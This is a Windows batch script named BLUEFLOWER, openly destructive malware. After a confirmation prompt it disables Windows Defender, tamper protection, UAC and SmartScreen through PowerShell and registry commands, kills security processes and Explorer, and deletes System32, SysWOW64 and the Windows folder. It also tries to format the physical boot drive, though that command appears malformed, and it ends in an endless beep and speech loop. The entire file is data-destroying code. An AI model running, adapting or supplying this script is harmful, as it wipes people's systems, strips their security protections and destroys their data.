@echo off
title BLUEFLOWER
color 4f
mode con: cols=100 lines=35
cls

echo.
echo                  ██████╗ ██╗   ██╗███████╗
echo                  ██╔══██╗██║   ██║██╔════╝
echo                  ██████╔╝██║   ██║█████╗  
echo                  ██╔══██╗██║   ██║██╔══╝  
echo                  ██████╔╝╚██████╔╝███████╗
echo                  ╚═════╝  ╚═════╝ ╚══════╝
echo.
echo               THIS WILL RENDER YOUR DEVICE USELESS
echo               Continue? (Y = Yes, total destruction / N = No)
set /p choice="                                 > "

if /i not "%choice%"=="Y" if /i not "%choice%"=="y" goto abort

:destroy
cls
echo SLAUGHTERING WINDOWS SECURITY

powershell -ExecutionPolicy Bypass -Command "try{Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue}catch{}" >nul 2>&1
powershell -ExecutionPolicy Bypass -Command "try{Set-MpPreference -DisableIntrusionPreventionSystem $true -ErrorAction SilentlyContinue}catch{}" >nul 2>&1
powershell -ExecutionPolicy Bypass -Command "try{Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue}catch{}" >nul 2>&1
powershell -ExecutionPolicy Bypass -Command "try{Set-MpPreference -DisableScriptScanning $true -ErrorAction SilentlyContinue}catch{}" >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v AllowFastServiceStartup /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v ServiceKeepAlive /t REG_DWORD /d 0 /f >nul 2>&1
sc stop WinDefend >nul 2>&1
sc config WinDefend start= disabled >nul 2>&1
taskkill /f /im MSMpEng.exe /im MsSense.exe /im SecurityHealthSystray.exe >nul 2>&1

rd /s /q "%ProgramFiles%\Windows Defender" >nul 2>&1
rd /s /q "%ProgramData%\Microsoft\Windows Defender" >nul 2>&1

reg add "HKLM\SOFTWARE\Microsoft\Windows Defender Features" /v TamperProtection /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\SmartScreen" /v ConfigureAppInstallControl /t REG_SZ /d "Anywhere" /f >nul 2>&1

taskkill /f /im taskmgr.exe >nul 2>&1
taskkill /f /im explorer.exe >nul 2>&1

echo Taking ownership...
takeown /f C:\Windows\System32 /r /d y >nul 2>&1
icacls C:\Windows\System32 /grant Administrators:F /t /c >nul 2>&1
echo Deleting System32...
rd /s /q C:\Windows\System32 >nul 2>&1
rd /s /q C:\Windows\SysWOW64 >nul 2>&1
rd /s /q C:\Windows >nul 2>&1

echo Bricking bootloader...
format \\.\PhysicalDrive0 /fs:ntfs /q /y >nul 2>&1

powershell -Command "while($true){[Console]::Beep(32767,100); $v=New-Object -ComObject Sapi.SpVoice; $v.Rate=10; $v.Speak('BLUEFLOWER HAS WON')}" >nul 2>&1

cls
echo.
echo           WINDOWS SECURITY = DEAD (no errors)
echo           SYSTEM32          = GONE
echo           BOOTLOADER        = BRICKED
echo.
echo                 YOUR PC IS NOW ETERNAL DARKNESS
echo                      LOVE, BLUEFLOWER 🌸
pause >nul

:abort
echo Aborted. BLUEFLOWER will wait patiently...
timeout /t 3 >nul
exit
